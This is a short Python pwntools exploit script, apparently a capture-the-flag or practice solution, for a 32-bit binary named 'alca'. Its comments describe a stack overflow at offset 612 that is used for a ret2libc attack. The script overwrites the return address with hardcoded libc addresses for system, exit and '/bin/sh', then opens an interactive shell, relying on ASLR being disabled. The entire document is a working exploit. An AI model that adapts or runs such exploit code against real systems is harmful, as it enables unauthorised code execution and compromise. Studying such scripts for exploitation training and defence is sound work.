#!/usr/bin/python

# arch: 32 bit
# protections: NX
# vuln type / strategy: stack-based overflow - performing ret2libc and calling system with /bin/sh since the stack is not executable

# offset: 612

from pwn import *

system = (0xf7dfdcc0)
ret_exit = (0xf7df0640)
arg = (0xf7f48b62)

payload = "A"*612
payload += p32(system)
payload += p32(ret_exit)
payload += p32(arg)

r = process('./alca')
r.sendline(payload)
r.interactive()


# Since ASLR is disabled, libc addresses will not change. So we can retrieve the addresses of system, exit and /bin/sh from gdb and pasting them into the exploit without much trouble.
